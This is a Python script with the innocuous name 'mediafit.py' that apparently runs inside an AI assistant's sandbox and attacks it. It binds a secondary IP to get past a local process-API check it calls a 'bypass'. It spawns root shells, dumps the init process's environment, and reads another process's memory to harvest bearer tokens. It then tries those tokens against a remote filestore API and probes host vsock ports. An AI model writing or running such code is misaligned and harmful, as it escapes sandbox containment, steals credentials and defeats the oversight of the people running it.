#!/usr/bin/env python3
# mediafit.py v6.8 -- FIX SPAWN + VALIDATE TOKENS BY allowed_roots
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "6.8", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
BIN = "/opt/rclone/rclone-filestore"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=15):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

# ---------------- ws ----------------
def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=4.0):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        tag = {1:"TEXT",2:"BIN",8:"CLOSE",10:"PONG"}.get(op, "OP%s" % op)
        t = d.decode(errors="replace")
        w("        << %s(%d) %s" % (tag, len(d), t[:700].replace("\n", " | ")))
        out.append(t)
    return out

def ws_try(src, msg, label, dur=4.0):
    s = ws_hs(src)
    if not s: w("  [%s] hs fail" % label); return None
    try:
        ws_send(s, json.dumps(msg)); return ws_read(s, dur)
    finally:
        try: s.close()
        except Exception: pass

def base_spec(pid, cmdline, mem=268435456, extra=None, cwd="/"):
    cr = {"cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": cwd,
          "rows": 24, "cols": 80, "timeout": 40, "clear_env": False, "uid": 0, "gid": 0,
          "allow_process_id_reuse": True, "reattachable": True}
    if mem is not None: cr["memory_limit_bytes"] = mem
    if extra: cr.update(extra)
    return {"process_id": pid, "create_req": cr}

# ---------------- ip ----------------
SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00", socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=8.0, shutdown_wr=False):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((cid, port))
        req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
        if body is not None:
            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
        s.sendall(req.encode()+(body or b""))
        if shutdown_wr:
            try: s.shutdown(socket.SHUT_WR)
            except Exception: pass
        d = b""
        try:
            while len(d) < 8192:
                c = s.recv(2048)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close(); return d
    except Exception as e: return repr(e).encode()

# ===================== RUN =====================
def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. FACTS")
    w("kernel: " + sh("uname -a").strip())
    w("ls /process_api: " + sh("ls -la /process_api /init 2>&1 | head -5").replace("\n", " | "))
    w("find process_api: " + sh("find / -maxdepth 3 -name 'process_api*' -not -path '/proc/*' 2>/dev/null | head").replace("\n", " | "))
    w("proc1 exe: " + sh("ls -la /proc/1/exe /proc/1/root 2>&1 | head -4").replace("\n", " | "))

    sec("A. READ process_api BINARY  (authoritative schema)")
    blob = b""
    for p in ("/proc/1/exe", "/process_api", "/init"):
        try:
            d = open(p, "rb").read(64*1024*1024)
            if d[:4] == b"\x7fELF":
                blob = d; w("  loaded %s (%d bytes)" % (p, len(d))); break
        except Exception as e:
            w("  %s -> %s" % (p, repr(e)[:90]))
    if blob:
        ss = set(x.decode(errors="replace") for x in re.findall(rb"[\x20-\x7e]{4,120}", blob))
        for label, pat in (("FIELDS", r"^(cmd|args|env_vars|cwd|rows|cols|timeout|memory_limit_bytes|clear_env|uid|gid|allow_process_id_reuse|reattachable|process_id|create_req|expected_container_name|root|chroot|pty|tty|program|executable|shell|stdin|user|group|working_dir|env)$"),
                           ("create_req", r"create_req"),
                           ("spawnerr", r"(?i)failed to spawn|no such file|process limit|tracked processes"),
                           ("fieldsuffix", r"^(.*_(id|bytes|ms|secs|env|dir|path|args))$"),
                           ("unknownfield", r"(?i)unknown field|expected one of")):
            hits = sorted(x for x in ss if re.search(pat, x))[:25]
            w("  [%s] %s" % (label, " | ".join(h[:60] for h in hits)))
        w("  -- all short field-like tokens --")
        w("    " + ", ".join(sorted(x for x in ss if re.match(r"^[a-z][a-z0-9_]{2,24}$", x))[:120]))
    else:
        w("  (binary unreadable; /proc/1/maps follows)")
        w("    " + sh("cat /proc/1/maps 2>&1 | head -8").replace("\n", "\n    "))

    sec("B. SPAWN: FIND THE WORKING cmd / cwd")
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  bypass FAILED"); flush(); return
    w("  bypass OK")
    # B1: deny_unknown_fields probe -> may print full field list
    w("  -- B1 unknown-field probe (may dump schema) --")
    ws_try(ALIAS, base_spec("mf_unk", "true", extra={"zzz_bogus": 1}), "inner-bogus", 4.0)
    sp = base_spec("mf_unk2", "true"); sp["zzz_bogus"] = 1
    ws_try(ALIAS, sp, "outer-bogus", 4.0)
    # B2: cmd/cwd matrix
    w("  -- B2 cmd x cwd matrix --")
    for cmd in ("/bin/sh", "/bin/dash", "/usr/bin/env", "/bin/bash", "/usr/bin/python3",
                "/bin/busybox", "sh", "/process_api", "/bin/ls", "/usr/bin/id"):
        for cwd in ("/", "/tmp"):
            r = ws_try(ALIAS, base_spec("mf_" + cmd.strip("/").replace("/", "_") + cwd.replace("/", "_"),
                       "echo OK_SPAWN; id; pwd", cwd=cwd, extra={"cmd": cmd}), "%s@%s" % (cmd, cwd), 3.5)
            j = " ".join(r or [])
            if "ProcessCreated" in j and "FailedToStart" not in j:
                w("      >>> WORKING: cmd=%s cwd=%s" % (cmd, cwd)); break
        else:
            continue
        break
    # B3: with a working cmd, dump PID1 env
    w("  -- B3 PID1 env via child (clear_env=false) --")
    ws_try(ALIAS, base_spec("mf_env", "echo ===ENV===; env | sort; echo ===END==="),
           "env", 6.0)

    sec("C. TOKENS: VALIDATE AGAINST OWN allowed_roots")
    cands = set()
    try:
        maps = open("/proc/57/maps").read().splitlines()
        fh = open("/proc/57/mem", "rb", buffering=0)
        total, buf = 0, b""
        for ln in maps:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception as e:
        w("  mem err " + repr(e)); buf = b""
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.add(mm.group(0).decode())
    w("  raw candidates=%d" % len(cands))
    def b64d(x):
        x += "=" * (-len(x) % 4)
        return base64.urlsafe_b64decode(x)
    uniq = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 80: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        key = (pl.get("filesystem_id"), tuple(pl.get("allowed_roots") or []), pl.get("readonly"))
        if key not in uniq: uniq[key] = t
    w("  unique scoped tokens=%d" % len(uniq))
    import urllib.request as ur
    def call(path, tok):
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/listDirectory",
                            data=json.dumps({"path": path}).encode(),
                            headers={"Content-Type": "application/json",
                                     "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=8) as r: return r.status, r.read().decode(errors="replace")
        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
        except Exception as e: return "ERR", repr(e)
    for key, tok in uniq.items():
        p = tok.split(".")
        pl = json.loads(b64d(p[1]))
        roots = pl.get("allowed_roots") or ["/"]
        w("  ---- token readonly=%s roots=%s payloadlen=%d" % (pl.get("readonly"), roots, len(p[1])))
        w("       full claims: " + json.dumps(pl)[:900])
        for r0 in roots[:3]:
            for path in (r0, r0.rstrip("/") + "/", "/"):
                c, b = call(path, tok)
                w("       path=%-22s -> %-5s %s" % (path, c, b[:160]))
                if c == 200:
                    w("       *** VALID with this token"); break

    sec("D. HOST OTLP 5005 (SHUT_WR + bigger payload)")
    big = b"\x0a\x00" * 1
    for body in (b"\x0a\x00", b"\x0a\x04\x12\x02\x0a\x00", big):
        d = vsock_http(2, 5005, "POST", "/v1/metrics", body, "application/x-protobuf",
                       shutdown_wr=True)
        w("  body=%r -> %s" % (body, d[:180].decode(errors="replace").replace("\r\n", " | ") or "(empty)"))
        time.sleep(0.3)

    sec("VERDICT")
    w("  binary read ......... %s" % bool(blob))
    w("  unique tokens ....... %d" % len(uniq))
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)